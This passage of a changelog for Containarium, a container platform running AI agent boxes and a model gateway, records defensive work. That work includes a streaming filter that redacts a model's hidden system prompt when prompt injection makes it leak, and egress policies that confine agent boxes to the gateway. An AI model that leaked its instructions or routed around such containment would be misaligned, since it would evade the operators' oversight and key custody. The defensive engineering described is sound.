  `id`/`object`/`created`/`model`, so the filtered stream is byte-compatible with
  what the client expects. Leak redaction and metering are unchanged. The
  re-emitted chunks are built from typed structs (no `map[string]any`).

## [0.46.3] - 2026-06-25

### Fixed

- **Model-gateway dropped/mis-tagged tool calls on the `gemini-openai` provider
  → agent chats hung.** Gemini's OpenAI-compat surface is not OpenAI-conformant
  for tool calls: it returns `finish_reason: "stop"` even when the response
  carries a `tool_calls` delta. The gateway passed this through unchanged, so an
  agent client (e.g. a hosted LibreChat workspace) never recognized the tool
  call, and the generation hung until the client's stale-job reaper killed it
  (surfacing as "Generation timed out"). Worse, the SSE leak-filter path (active
  whenever a system prompt is present — the normal agent state) reconstructed
  chunks from `content` + `finish_reason` only and **dropped the `tool_calls`
  field entirely**. The gateway now (a) preserves `tool_calls` deltas verbatim on
  both the filtered and pass-through SSE paths (a tool call is a structured
  invocation, not a system-prompt-leak vector), and (b) normalizes
  `finish_reason` `"stop"` → `"tool_calls"` once a tool call has been seen, on
  the streaming and non-streaming OpenAI-shaped paths. Plain text turns are
  untouched. This makes agentic tool-calling work through the managed gateway.

## [0.46.2] - 2026-06-24

### Fixed

- **New boxes' jump accounts were left locked → SSH broken on UsePAM=no hosts
  (#687/#808).** #798 added the jump-account unlock to `EnsureJumpServerAccount`,
  but boxes are created through the Manager, which calls
  `CreateJumpServerAccount` — and that path never unlocked. So a new box's host
  jump account stayed `!`-locked; on a `UsePAM=no` host (the hardened jump/BYOC
  setting) sshd refuses a locked account even for public-key auth, recurring the
  "account is locked" sentinel→host SSH failure for every new box. (Benign on a
  `UsePAM=yes` host, which is why it went unnoticed on the cloud workhorse.)
  `CreateJumpServerAccount` now unlocks on both the create and already-exists
  (self-heal) paths.

## [0.46.1] - 2026-06-24

### Fixed

- **Egress via client was broken on every path (#808).** `StartEgressProxy`
  (v0.46.0) used the daemon's `proxyIP` as the relay listen address, but it was
  never wired (`NewNetworkServer` is called with `""`), so the precondition
  tripped on every call and egress-via-client failed regardless of transport.
  The gateway is now derived from the container network CIDR (its first host
  address, e.g. `10.100.0.0/24` → `10.100.0.1` — the address a box already
  reaches the daemon on), so egress works on every daemon, not just app-hosting
  ones.
- **`StartEgressProxy` resolved the wrong Incus instance name (#808).** It
  looked up the box by the bare username (`cld-abcd1234`), but Incus instances
  are named `<username>-container`, so the lookup 404'd once the gateway fix
  above let execution reach it. Now maps username → `<username>-container`
  (tolerating an already-qualified name), matching every other container RPC.

## [0.46.0] - 2026-06-24

### Added

- **Egress via client (#808).** Route a box's outbound traffic through the
  operator's workstation — so a box (e.g. a headless browser) egresses with the
  operator's IP — even when the box can't reach the operator (a NAT'd laptop).
  A box runs in its own network namespace and can't consume a host-side
  `ssh -R` listener directly (it lands in the host netns); the daemon bridges it
  in. Shipped:
  - `containarium egress-relay` (Phase 2a) — a source-restricted host-side TCP
    relay binding the bridge gateway, forwarding to an operator-reachable SOCKS
    (e.g. over Tailscale), accepting only the target box's IP.
  - `NetworkService.StartEgressProxy`/`StopEgressProxy` (proto-first) + the
    `containarium egress-via-client <box>` command (Phase 2b): starts a local
    SOCKS, opens an `ssh -R` exposing it on the box's host loopback, asks the
    daemon to bridge it into the box (source-restricted), prints the in-box
    SOCKS address, and tears down on exit. `--http` targets the cloud control
    plane (a `ctnr_` token) so it works for cloud boxes too; otherwise gRPC to a
    daemon (direct / BYOC). Validated live (box egress flipped from the host's
    IP to the operator's). Design: `docs/EGRESS-VIA-CLIENT-DESIGN.md`.

### Changed

- Bumped `github.com/mark3labs/mcp-go` 0.54.1 → 0.55.0 and
  `google.golang.org/api` 0.284.0 → 0.285.0 (dependabot).

## [0.45.1] - 2026-06-23

### Fixed

- **Model-gateway `/__gateway/status` reachable in the embedded daemon (#794).**
  The live gauge (`{inflight, completed, failed}`) added in #794 was only
  reachable in the standalone `cmd/model-gateway`: when the gateway is embedded
  in the daemon it is mounted under `/v1/model/`, so `/__gateway/status` at the
  daemon root fell through to the wake catch-all and `/v1/model/__gateway/status`
  was parsed as a provider name. The daemon now routes `/__gateway/status` and
  `/__gateway/healthz` to the gateway handler at the root so operators can
  `curl localhost:<http-port>/__gateway/status`. `/__gateway/usage` is
  intentionally not exposed there (per-tenant token counts, unauthenticated
  handler); usage continues to flow to the metrics/billing pipeline. The
  per-request START/END lifecycle logging from #794 was already working.

## [0.45.0] - 2026-06-23

### Added

- **Asymmetric (ed25519) sentinel→daemon authentication (#688).** The
  sentinel↔daemon shared secret (`CONTAINARIUM_SENTINEL_AUTH_SECRET`) is
  symmetric and deployment-wide: every daemon that must *verify* a sentinel
  request also holds the key to *forge* one. On a multi-tenant deployment a
  BYO-compute host — which only needs to accept the sentinel's keysync/certsync —
  could forge a request the shared host accepts and push attacker-controlled SSH
  keys into other tenants' boxes (`/authorized-keys/sentinel`). This adds an
  ed25519 scheme for the sentinel→daemon direction (keysync, certsync, the
  `/sentinel/peers` response): the sentinel holds the PRIVATE key
  (`CONTAINARIUM_SENTINEL_SIGNING_KEY`), every daemon gets only the PUBLIC key
  (`CONTAINARIUM_SENTINEL_PUBLIC_KEY`). A daemon can verify but cannot forge, so
  the public key is safe to distribute to any host including BYOC. The verifier
  is dual-accept (ed25519 preferred, HMAC legacy) so a mixed fleet interoperates
  during migration, and `containarium sentinel keygen` emits the keypair. Safe
  by default — with no ed25519 env set, behavior is identical to the HMAC scheme.
  Rollout is sequenced: distribute the public key to all daemons first, then set
  the signing key on the sentinel, then drop the shared secret → ed25519-only,
  no forge-capable secret on any host. The daemon→sentinel PKI bootstrap
  (`/sentinel/ca`, `/sentinel/peer-cert`) is a separate trust direction and is
  unchanged.

## [0.44.0] - 2026-06-23

### Added

- **create/list/delete container output now shows the resolved backend + pool.**
  The MCP container ops never displayed *where* a box landed, so a `backend_id`
  that matched no host (and silently fell back to the default pool) was invisible
  until a side effect — e.g. an egress-IP test — exposed it. Now `list_containers`
  and `create_container` print `Backend:`/`Pool:`, `delete_container` reports the
  backend it removed the box from (best-effort pre-fetch), and `create_container`
  emits an explicit ⚠️ warning when the box lands on a backend other than the
  one requested. Surfaces the silent-fallback footgun at the tool layer (cloud
  #685/#686).

- **`delete_route` MCP tool (unexpose).** The MCP server had `expose_port` +
  `list_routes` but no way to *remove* a route, so an agent that exposed an app
  (or hit its subdomain quota on the cloud) couldn't take one down. Adds a
  `delete_route` tool (domain → `DELETE /v1/network/routes/{domain}`, scoped to
  `routes:write`, idempotent) and the backing `Client.DeleteRoute`. Pairs with
  the cloud's `delete_route` REST verb so the in-chat workspace agent can wire
  *and* unwire HTTP. (55 tools now.)

- **Model-gateway request-lifecycle observability.** The gateway emitted only a
  single metering log on completion — and only for *non-streaming* responses —
  so for a streaming chat there was no way to tell whether a request was still
  generating, finished, or hung. Every accepted request now logs a `START` and a
  matching `END` line keyed by a monotonic request id, with status (ok/error),
  HTTP code, stream flag, duration, and token usage; a streaming response that
  ends without a usage event is flagged `warn=stream-ended-without-usage` (the
  classic "looks hung" case). A new `GET /__gateway/status` endpoint exposes the
  live gauge — `{inflight, completed, failed}` — so `inflight` stuck above zero
  with no new completions is a directly observable "hung request" signal. The
  per-usage metering log is folded into `END`; billing via the OTel sink is
  unchanged.

### Changed

- **LibreChat workspace recipe pins `gemini-flash-latest` and drops the `pro`
  pick.** The recipe offered `["gemini-2.5-flash", "gemini-2.5-pro"]`; the `pro`
  option is a reasoning model whose long pre-token think phase reads as a hung
  chat (the UI streams nothing until reasoning finishes), and a pinned
  point-version can be retired by the provider out from under us (Google has
  already decommissioned `gemini-2.0-flash`, which 404s — and a 404 on the
  streaming path hangs the client). The workspace now defaults to
  `gemini-flash-latest` (auto-tracks the current flash, so it never points at a
  retired model) for `titleModel` and every skill-persona modelSpec, and offers
  `["gemini-flash-latest", "gemini-2.5-flash"]` in the model list — keeping
  `gemini-2.5-flash` available so conversations already pinned to it don't break
  with "model not available". Only `gemini-2.5-pro` is dropped. Existing boxes
  are unaffected until redeployed; the two live workspaces were patched
  out-of-band.

### Fixed

- **Sentinel-key reconcile now absorbs unmarked / duplicate copies (#687).** The
  host-side `authorized_keys` reconcile only removed a sentinel upstream key when
  it was preceded by the sentinel marker comment. A copy seeded by an older path
  or injected manually lands *without* the marker, so the marker scan never
  reconciled it and copies accumulated across rotations. The reconcile now drops
  every line whose key material (`<type> <base64>`, comment-ignored) equals the
  current key — marked or not — so the canonical block is the sole occurrence.
  Comparing by key material also stops a comment-only difference from being
  miscounted as a rotation.

- **Jump account is unlocked on every ensure, and the unlock is verified (#687).**
  `EnsureJumpServerAccount` only unlocked the account on the create path; the
  already-exists branch fixed the shell and returned, so an account left locked
  never self-healed — and the create-path unlock swallowed its error. With
  `UsePAM no` (the hardened jump/BYOC-host setting) OpenSSH refuses a locked
  account *even for public-key auth*: the box accepts the client key but the
  sentinel→host upstream hop dies with "account is locked", surfacing as a
  confusing "authenticated with partial success" loop. The full idempotent
  account state (unlock, home perms, `.ssh`, sudoers) now runs on both paths so a
  misprovisioned account recovers on the next create/reconcile, and the unlock is
  verified by reading the shadow password field directly — treating the account
  as locked only when it starts with `!` (sshd's own check), since `passwd -S`
  reports both `!` (locked) and `*` (disabled-but-usable) as `L`.

## [0.43.2] - 2026-06-22

### Fixed

- **In-box MCP now actually works (HTTPS + token perms).** The v0.42.0
  reachability fix routed the in-box MCP over `http://core-caddy`, but the
  `mcp-server` client refuses plaintext base URLs (security guard) — so the MCP
  was reachable but rejected. core-caddy already serves the apex's **valid
  wildcard cert** and accepts a bridge client's plain TLS (its `:443`
  proxy-protocol wrapper only *requires* PROXY from the sentinel subnet), so the
  recipe now keeps `https://` for the `/etc/hosts → core-caddy` route — same
  scheme + valid TLS as an external client, only the name resolution is internal.
  Also: the in-box token is now owned by the image's `node` user (uid 1000) with
  `0600` (was world-readable `0644`) — the MCP refuses insecure token perms, and
  a root-owned `0600` would be unreadable by `node`; uid-1000-owned `0600`
  satisfies both. Verified: the real `mcp-server` lists the org's containers and
  LibreChat reports `[MCP] Initialized with … 54 tools`.

## [0.43.1] - 2026-06-22

### Fixed

- **Streaming token metering double-counted usage.** The provider emits usage
  cumulatively across multiple SSE chunks; the gateway recorded *each* usage
  event, inflating the metered total (a single turn logged twice — `out=13` then
  `out=20`). It now records usage **once**, with the final cumulative value.
  (Regression in the v0.43.0 streaming metering.)

## [0.43.0] - 2026-06-22

### Added

- **Model-gateway meters the streaming chat path (input/output tokens).**
  Previously only non-streaming JSON responses were metered; the SSE streaming
  chat (the workspace default) passed through unmetered. The gateway now
  intercepts `text/event-stream` responses — injecting
  `stream_options.include_usage` so the provider emits a final usage event — and
  records per-tenant **input and output** tokens (the streaming half of the
  metering plane). Always on, fail-open.

- **Streaming output filter — redacts system-prompt (skill persona) leakage
  (#670 layer 2).** On the streaming chat path the gateway runs a hold-back
  window over the assembled assistant text; if the model echoes a verbatim run
  of its hidden system prompt (a prompt-injection exfiltration attempt), the
  leak is caught *before* it reaches the client and replaced with a refusal.
  Default on (`CONTAINARIUM_GATEWAY_OUTPUT_FILTER=0` to disable); fail-open — any
  unrecognized stream shape passes through unfiltered rather than breaking chat.

## [0.42.0] - 2026-06-22

### Fixed

- **Workspace box can now reach the cloud API (fixes in-box MCP + skill
  live-sync).** A box on the workhorse host can't reach the public cloud apex —
  it hairpins back to the same host — so the in-box MCP (`CONTAINARIUM_SERVER_URL`)
  and the skill live-sync poll both got connection failures. The `librechat`
  recipe now resolves **core-caddy** (the host reverse proxy that already serves
  the apex vhost, reachable on the container bridge by name), adds an `/etc/hosts`
  entry mapping the apex hostname to it, and uses `http://` (core-caddy `:443`
  needs PROXY-protocol; `:80` is open and routes by `Host`). Both the MCP server
  URL and the live-sync `SKILLS_URL` use this internal route; the sync script
  self-heals the `/etc/hosts` entry each run. Falls back to the original URL when
  core-caddy isn't resolvable (standalone / non-cloud deploys reach the apex
  directly). Refs the cloud hairpin issue.

## [0.41.0] - 2026-06-22

### Added

- **LibreChat workspace skills live-sync (no redeploy needed).** Installing or
  uninstalling a skill in the Workspace panel now reflects in a running box's
  persona selector within ~60s, instead of only on the next redeploy. The recipe
  writes a `sync-skills.sh` + systemd timer that polls the cloud's
  `/v1/recipes/workspace/skills` (with the in-box MCP token), re-renders the
  modelSpecs via the now-file-based `gen_modelspecs.py`, and restarts LibreChat
  ONLY when the rendered config actually changed. The timer is armed only when
  MCP is wired (it reuses that token + server URL); without it the box keeps its
  deploy-time skills. Pairs with the cloud read endpoint (Containarium-cloud).

## [0.40.0] - 2026-06-22

### Added

- **Workspace skills are hidden personas in the chat (`skills` param).** A skill
  is no longer a separate job you dispatch — it's a hidden system prompt the chat
  runs under. Each installed skill becomes a LibreChat **model-spec** the user
  picks BY NAME in the selector; the whole conversation then runs under that
  skill's instructions, which are **never shown in the UI** (they live in
  `librechat.yaml` server-side, so they stay hidden even with the full UI
  embedded — unlike a LibreChat "agent", whose instructions are visible in the
  builder). All inference goes through the model-gateway. The skills come from
  the `skills` param (JSON `[{"name","instructions"}]`, injected by the cloud
  from the org's installed set); a default general assistant is always present.
  Multi-line `SKILL.md` prompts serialize safely (generated via python3 →
  `json.dumps` YAML scalars).

- **LibreChat workspace embeds the full UI by default (`librechat_ui` param).**
  The managed `librechat` workspace previously hid LibreChat's left nav so the
  iframe showed only the chat pane. It now embeds the **whole** LibreChat UI by
  default — nav, conversation history, the agents builder, the tools/MCP menu,
  presets — so installed MCP tools and agents are discoverable in LibreChat's own
  surface. Set `librechat_ui: chat` to keep the chat-only view (the old
  behaviour). Implemented in the in-box Caddy proxy: `full` lets `/` fall through
  to LibreChat; `chat` routes `/` to the bootstrap helper's nav-hiding shell.
  Zero-click login and the enforced model-spec are unchanged in both modes.

### Fixed

- **LibreChat workspace chat hung forever ("thinking", zero tokens).** The
  `librechat` recipe enforced a model-spec with `preset.endpoint: "agents"`, but
  LibreChat's frontend always posts chat turns to the **custom** endpoint
  (`Containarium (Gemini)`, `endpointType: custom`). With `enforce: true`,
  `buildEndpointOption.js` rejected every turn as `"Model spec mismatch"` before
  it ever reached the model; the UI swallowed the SSE error and span on
  "thinking" indefinitely (the request never hit gemini/the gateway). The spec
  now targets the custom endpoint directly and carries the assistant persona via
  `promptPrefix`, so chat turns stream normally. The recipe no longer pre-creates
  a tool-equipped agent (an `endpoint: "agents"` spec never drove the frontend, so
  the MCP tools never reached the chat anyway); the in-box MCP servers are still
  injected and togglable per-conversation, with auto-attach tracked as a
  follow-up.

## [0.39.0] - 2026-06-21

### Changed

- **Workspace agent gets a system prompt.** The pre-created `librechat` agent had
  no `instructions`, so the model inferred its whole role from its tool names and
  deflected everything else with "I can only manage containers". It now ships with
  a system prompt making it a helpful workspace assistant that *also* has the
  platform tools, set via a PATCH after create (LibreChat's agent CREATE can drop
  fields; PATCH persists `instructions` + `tools` reliably).

## [0.38.0] - 2026-06-21

### Added

- **LibreChat workspace opens straight into a tool-equipped assistant.** The
  `librechat` recipe now pre-creates a default LibreChat **agent** (gemini via the
  model-gateway + the in-box Containarium MCP tools, attached by the
  `<tool>_mcp_containarium` keys for exactly the scoped/invoke-only set) and
  enforces it as the only model-spec. So the chat opens on a working, tool-aware
  assistant instead of LibreChat's empty Agents builder — fixing the
  `agent_id is required` error — with the endpoint/model pickers hidden (curated,
  locked). (Agent + auth calls send a User-Agent; LibreChat's agents API rejects
  requests without one.)

### Changed

- **Workspace owner is the real user, not "admin".** New `auth_name` param; the
  owner login is created with that name and a username derived from the email.
  The cloud injects the deploying user's identity at deploy.
- **Chat-only embed.** The in-box helper now serves the SPA shell at `/` with an
  injected stylesheet that hides LibreChat's left nav, so the embedded iframe
  shows only the chat pane (the console's Manage drawer is the single sidebar).

## [0.37.0] - 2026-06-21

### Added

- **Zero-click iframe access for the LibreChat workspace.** The `librechat`
  recipe now fronts LibreChat with an in-box Caddy proxy (the exposed port is the
  proxy, 8080, not LibreChat's 3080) plus a tiny stdlib auth helper. The helper
  mints a single-use, 120-second handoff token (`/__mint`, reachable only in-box)
  and a `/__ws_login?t=` bootstrap that does one fresh LibreChat login and
  re-emits the session cookies as `SameSite=None; Secure` so they survive a
  cross-site iframe; the proxy rewrites LibreChat's `SameSite=Strict` cookies to
  `None` so refresh rotation keeps working embedded. `GetWorkspaceAccess` now
  supports librechat (mints via the helper; falls back to the static
  agent-workspace token), so the console can embed the workspace with no
  re-login. LibreChat's own `/login` still works through the proxy as a fallback.

## [0.36.2] - 2026-06-21

### Fixed

- **In-box MCP never connected in a LibreChat workspace.** Two bugs, both in the
  `librechat` recipe path:
  - **`mcp-server` couldn't execute in the LibreChat container.** It was built
    natively on a linux/amd64 runner with CGO enabled → a glibc-dynamic binary
    (needs `/lib64/ld-linux-x86-64.so.2`), but LibreChat's image is Alpine/musl,
    so the spawn failed with `exec: No such file or directory` and the MCP loaded
    0 tools. `mcp-server` is a pure-Go REST/gRPC client; it's now built with
    `CGO_ENABLED=0` (fully static, runs on any libc).
  - **The MCP token was unreadable.** The recipe wrote `ctn-token` as `0600`
    owned by root, but LibreChat (and the `mcp-server` it spawns) run as the
    `node` user (uid 1000) and the token is bind-mounted read-only → permission
    denied. The recipe now writes it `0644` (single-tenant box; the token is a
    scoped, revocable, least-privilege credential).

## [0.36.1] - 2026-06-21

### Fixed

- **LibreChat crash-looped when the MCP was injected.** The `librechat` recipe
  wrote an `mcpServers.containarium` block with only `command` + `env`, but
  LibreChat's config schema requires the stdio MCP variant to carry `type: stdio`
  and an `args` array. Without them the discriminated union fell through to the
  URL-based variants and validation failed (`ZodError: args/url Required`), so
  LibreChat exited on every boot and the box served 502. The block now emits
  `type: stdio` and `args: []`. (Existing boxes need a redeploy or a one-line
  config patch; new boxes are correct.)

## [0.36.0] - 2026-06-21

### Added

- **LibreChat workspace can run the Containarium MCP (#758).** The `librechat`
  recipe gains optional `mcp_server_url` + `mcp_token` params: when both are set,
  post_start installs the `mcp-server` binary (stdio) and wires it into
  LibreChat's `mcpServers`, so the chat agent can operate the platform from the
  conversation (list / deploy boxes, expose ports, run skills). The token is the
  only credential in the box; scope enforcement is server-side. Empty params →
  no MCP (the self-hosted default). Pairs with the cloud's scoped-token mint.

## [0.35.0] - 2026-06-21

### Added

- **LibreChat command-workspace recipe (#755).** A new `librechat` recipe
  packages LibreChat + MongoDB in a box, wired to the managed model-gateway: the
  chat endpoint takes its key from the seeded gateway token (no real provider key
  in the box), users switch among curated models but cannot supply their own key,
  the admin is created from params, and self-registration is then locked.
  `containarium recipe deploy librechat …`.
- **Generic `code-review` agent skill (#756).** The first does-real-work skill in
  the OSS catalog — domain-agnostic, returns a structured JSON review
  (file / line / severity / issue / suggestion). Plus
  `docs/demos/agent-box-gateway-demo.sh`, a recordable CLI demo of the
  isolated-box + model-gateway flow.

### Changed

- **Model-gateway: OpenAI-compatible Gemini provider (#755).** New
  `gemini-openai` provider brokers Gemini via Google's OpenAI-compatible surface
  (`/v1beta/openai`, Bearer auth), so OpenAI-compatible clients (LibreChat /
  LiteLLM) can route through the gateway. Backed by the same `GEMINI_API_KEY`.
- **Recipes can opt into the managed gateway (#755).** New
  `Recipe.model_gateway_provider`: when set and the daemon brokers that provider,
  the daemon mints a scoped, revocable token and seeds
  `CONTAINARIUM_MODEL_GATEWAY_URL` / `_TOKEN` into the recipe's post_start — so a
  recipe app uses the platform key (metered, never in the box). Inert on a
  keyless self-hosted daemon.

## [0.34.0] - 2026-06-20

### Security

- **Agent-skill box: default-deny egress for every box (#750).** `RunAgentSkill`
  now installs a network policy for **every** provisioned box, including leaf
  skills (`allowed_peers: []`) in direct mode — previously such a box got no
  policy at all, so under ENFORCE it had no eBPF program and unrestricted egress.
  A leaf box's egress is now just the provider domains (+ operator CIDRs), with
  metadata and intra-tenant denied. (Behaviour is observe-only until ENFORCE is
  armed, as before; this ensures the box is actually covered once it is.)
- **Agent-skill box: pin the engine to the gateway provider (#748).** When the
  daemon serves a model-gateway it now sets `CONTAINARIUM_AGENT_ENGINE` to the
  engine matching the gateway's provider (anthropic→claude, gemini→gemini,
  openai→codex) on the in-box exec. Without this, a gemini/openai gateway run
  fell back to the default claude engine and failed (`Not logged in`) because the
  default engine reads the wrong gateway env vars.

### Changed

- **Release bundle verifies it ships every engine (#748).** `make
  bundle-agent-runtime` (and the release workflow) now runs
  `scripts/verify-agent-runtime-bundle.sh`, which fails the build unless the
  packaged `agent-runtime-bundle` contains a compiled `dist/engines/<name>.js`
  for every `src/engines/<name>.ts` **and** declares each runtime SDK
  (`@google/genai`, etc.) as a non-dev dependency. This prevents the silent
  engine-drop that left the gemini engine out of v0.33.0 (the tag predated the
  engine merge) — a future cut can no longer ship a bundle missing an engine.

### Added

- **Post-hoc container attribution endpoint (#746).** New
  `SetContainerAttribution` RPC (`POST /v1/containers/{name}/attribution`) merges
  labels onto an EXISTING container's config (merge, not replace — labels not
  named are left intact). The daemon stamps cloud attribution
  (`cloud_org_id` / `cloud_container_id` / `managed_by`) only at create today;
  this lets the hosted control plane stamp them after the fact, which its adopt
  flow (cloud #539) needs to bring a host's pre-existing (orphan) container under
  org management. Backed by `manager.AddLabel` (writes under
  `user.containarium.label.`); rejects core containers; 404 when the name
  doesn't resolve. Cloud→daemon plumbing (like `/authorized-keys/sentinel`) — no
  CLI verb. Typed clients gain `SetContainerAttribution` (gRPC + HTTP, the latter
  mapping a 404 to `Unimplemented` for old daemons).
- **Skill-box egress pinned to the model-gateway (#674).** When the daemon serves
  the model-gateway, a skill box's eBPF egress policy now allows only the gateway
  host (the LXC bridge gateway — also the daemon API + DNS) plus its allowed
  peers, and the direct provider domains (`api.anthropic.com`, …) are **dropped**
  — so a box can't bypass the gateway to reach a provider with a key it doesn't
  hold. Key-custody becomes enforced, not just convention. Pinning applies even
  to a skill with no `allowed_peers`. Observe-only by default (LOG_ONLY); it
  blocks only once eBPF enforcement is armed (`CONTAINARIUM_AGENT_NETWORK_POLICY_ENFORCE=1`).
  Direct mode (no gateway) is unchanged — provider domains are served as before.

- **Pull-based agent run-queue + poll-mode workers (#674).** An orthogonal
  delivery model to push: a producer `EnqueueAgentTask`s; long-lived worker
  boxes `LeaseAgentTask` (SQS-style visibility-timeout lease → at-most-one
  active worker per task, redelivery on expiry, stale-token completion
  rejected), run locally, and `CompleteAgentTask`. The queue core
  (`internal/server/agent_task_queue.go`) is an in-memory, lock-guarded FIFO
  with an injectable clock (unit-tested, race-clean). New CLI `containarium
  agent enqueue` (producer) and `StartAgentWorker` which provisions/reuses a
  skill box and mints a **queue credential** — a JWT scoped to `agents:run`
  only, separate from the skill's in-box token. The `agent-runtime` gains a
  `poll` mode (`CONTAINARIUM_AGENT_MODE=poll`): lease → run → complete in a
  loop, outbound-only, reusing the A2A `runTask`. Ships alongside the
  model-gateway design note (`docs/AGENT-MODEL-GATEWAY-DESIGN.md`).
- **Model-gateway usage → metering/billing pipeline (#674).** The gateway gains a
  pluggable `UsageSink` (kept free of an OTel dependency); the daemon wires an
  OTLP sink that emits per-tenant/skill/provider/model token counters
  (`model_gateway.calls`, `.input_tokens`, `.output_tokens`, `.cached_tokens`)
  through the existing metrics pipeline (→ VictoriaMetrics → dashboards/billing),
  on top of the in-memory `/__gateway/usage` readout. So model-call usage is now
  durable + aggregatable per tenant, not just a live snapshot. Uses the global
  meter — a no-op when monitoring is off, so it's always safe to wire; a nil sink
  (standalone) keeps the in-memory meter working.
- **Daemon-served model-gateway for skill boxes (#674, productionizing #737).**
  When the daemon holds a provider API key (`ANTHROPIC_API_KEY` / `OPENAI_API_KEY`
  / `GEMINI_API_KEY` — `GOOGLE_API_KEY` also works for Gemini), it now serves the
  model-gateway at `/v1/model/` and provisions every skill box to route its model
  calls through it: `provisionSkillBox` mints a short-lived, per-skill **gateway
  token** and seeds the box's SDK base-URL env (`gateway.env`, resolving the
  host from the box's default route in-box), which the in-box runtime sources
  before launch. The real provider key never enters a box, and every call is
  metered per tenant/skill. It's an **env change, not a code change** — the
  agent-runtime engines already honor these vars (Claude/OpenAI base-URL;
  Gemini via `CONTAINARIUM_MODEL_GATEWAY_URL`). Inert when no provider key is
  set — boxes run in direct mode (the OSS/self-hosted default). The `/v1/model/`
  mount is unauthenticated by the platform JWT middleware; it verifies the box's
  scoped gateway token itself.

### Fixed

- **`pool join` no longer drops a host's existing daemon flags (#702).** It used
  to reset the daemon `ExecStart` to a minimal command (`--rest
  --jwt-secret-file` + `--pool`), silently dropping any extra flags
  (e.g. `--app-hosting`, `--network-subnet <cidr>`) on the next restart — the
  worst case being a bring-your-own-compute host already running workloads on a
  custom bridge. `pool join` now reads the effective `ExecStart` (`systemctl
  show`), preserves those flags, re-sets only the managed `--pool` /
  `--base-domain` (idempotent on re-run), and warns + falls back to the minimal
  baseline when it can't read an existing unit. New repeatable `--daemon-flag`
  passes extra daemon flags through explicitly (preserve override / fresh-host
  use).

### Added

- **`pool join --region auto` — latency-based sentinel selection (#699).** A host
  joining a multi-region pool can now pass several candidate sentinels
  (`--sentinel region=host:port`, repeatable) and `--region auto`; the host
  probes each (median of TCP-connect RTTs) and self-selects the closest before
  writing the tunnel unit — latency can only be measured from the host, not the
  control plane. Fallbacks are explicit: one candidate skips probing, a
  candidate that fails to probe is excluded, and all-failed errors (never
  silently picks none). `--region <name>` picks a labeled candidate; a single
  `--sentinel` is unchanged (back-compatible). New `containarium pool regions
  --probe` prints the region/RTT table without joining. Pairs with the control
  plane returning the candidate list (cloud #538).
- **BYOC driver-token auto-refresh (#557).** A host enrolled with `cloud enroll`
  now keeps itself cloud-drivable past the 30-day token-expiry cap with no manual
  re-enroll. `cloud enroll` records the JWT-secret path in `cloud.yaml`
  (`jwt_secret_file`); the daemon's actuation client then re-mints a fresh admin
  driver token every ~20 days (⅔ of the cap) and pushes it to the cloud over the
  existing `ReportHostStatus` channel (new optional `driver_token` field). The
  cloud reseals and overwrites its stored credential, so it never expires.
  Best-effort: a missed cycle leaves ~10 days of runway. Hosts enrolled with
  `--no-driver-token` are unaffected.
- **Gemini engine for the in-box agent loop (`agent-runtime`).** A third
  pluggable engine alongside Claude and Codex, selected with
  `CONTAINARIUM_AGENT_ENGINE=gemini`. It drives the loop with the Google Gen AI
  SDK (`@google/genai`): `agent-box` is spawned as an MCP stdio server and
  handed to the SDK via `mcpToTool()`, with automatic function calling running
  the tool-use loop (capped at `maxTurns`). Auth via `GEMINI_API_KEY` /
  `GOOGLE_API_KEY`; default model `gemini-2.5-flash` — a cheap, fast model that
  makes it a budget-friendly way to exercise the agent mechanism end-to-end. The
  daemon's default agent egress now also allows
  `generativelanguage.googleapis.com` so an armed (ENFORCE) network policy
  doesn't strand a Gemini agent.

## [0.33.0] - 2026-06-19

### Added

- **`DeployRecipeRequest.async` — run a recipe's `post_start` in the background.**
  When set, `DeployRecipe` returns as soon as the container is created (state
  `CREATING`) instead of blocking until `post_start` finishes, then runs
  `post_start` + the port expose on a detached context. This is needed when a
  recipe is deployed over a connection with a request/idle timeout shorter than
  the work — e.g. a control plane reaching a BYOC host through the sentinel
  peer-proxy: a recipe that pulls a multi-GB image (like `agent-workspace`'s
  OpenHands) can exceed that timeout, and a synchronous deploy would be cut
  mid-pull (`EOF`), leaving the box half-provisioned. The CLI leaves `async`
  false so a human still sees `post_start`'s result inline. The box becomes
  fully functional once the background `post_start` completes; poll the
  container / its workspace access for readiness. Additive proto field
  (`async = 9`); existing callers are unaffected.

## [0.32.0] - 2026-06-18

### Added

- **`DeployRecipeRequest` now carries `labels`, forwarded to the provisioned
  container.** A recipe-deployed box is now labeled like a plain
  `CreateContainer` (the `deploy()` body forwards `req.Labels` into the inner
  `CreateContainerRequest`). Without this, a control plane that attributes
  containers to a tenant/org by label (e.g. the cloud's `cloud_org_id`
  filter) could not see a recipe-deployed box — so it couldn't front
  `deploy_recipe` for the `agent-workspace` recipe. Additive proto field
  (`labels = 8`); existing callers are unaffected.

- **`agent-workspace` recipe — a hosted web chat workspace in a box.** A new
  built-in recipe runs OpenHands ("Agent Canvas") inside an always-on box: a
  browser chat UI with live preview and multiple persisted conversations, all
  stored in the box (`/opt/openhands-state`). The model provider + API key are
  set in the workspace UI (Anthropic, OpenAI/Codex, Gemini, or any LiteLLM
  model). Auth lives in the box — an in-box reverse proxy fronts the app with
  HTTP basic auth plus a `SameSite=None` session cookie it issues, so the
  console can embed the workspace in an iframe and authenticate it without a
  prompt. New `RecipeService.GetWorkspaceAccess` RPC
  (`GET /v1/recipes/workspace/{name}/access`) + `containarium recipe
  workspace-access` CLI return the zero-click bootstrap URL, and a `web-ui`
  "Workspace" tab embeds the workspace (with a "Model setup" deep-link to the
  provider settings). The recipe takes a required `auth_password` parameter
  (secrets-based delivery is a tracked follow-up). See
  `docs/AGENT-WORKSPACE-SPIKE.md` and `docs/PRD-HOSTED-AGENT-WORKSPACE.md`.

### Fixed

- **Daemon unit `ReadWritePaths` now covers the doctor's required-writable set,
  so a freshly-installed host no longer boots DEGRADED.** With
  `ProtectSystem=strict`, every path the daemon's capability self-check
  (`hostcheck.DaemonWritablePaths`) requires writable must be in the unit's
  `ReadWritePaths` — otherwise the path is read-only to the daemon and the
  self-check fails. The shipped units omitted `/var/log` (which `useradd`
  touches via `/var/log/lastlog` — the "second capability trap") and, in the
  Terraform startup scripts, `/etc/containarium` + `/opt/containarium`. Fixed in
  all four unit sources (`containarium service install`, `scripts/containarium.service`,
  and both `terraform/.../startup-spot.sh`); a new test ties the generated unit's
  `ReadWritePaths` to `hostcheck.DaemonWritablePaths` so they can't drift again.
  Existing hosts heal on the next unit redeploy (or a drop-in adding the missing
  paths + `daemon-reload` + daemon restart).

## [0.31.2] - 2026-06-17

### Added

- **REST transport for the cloud actuation client.** The host-side actuation
  channel (`internal/cloud`) now speaks to a control plane that fronts its API
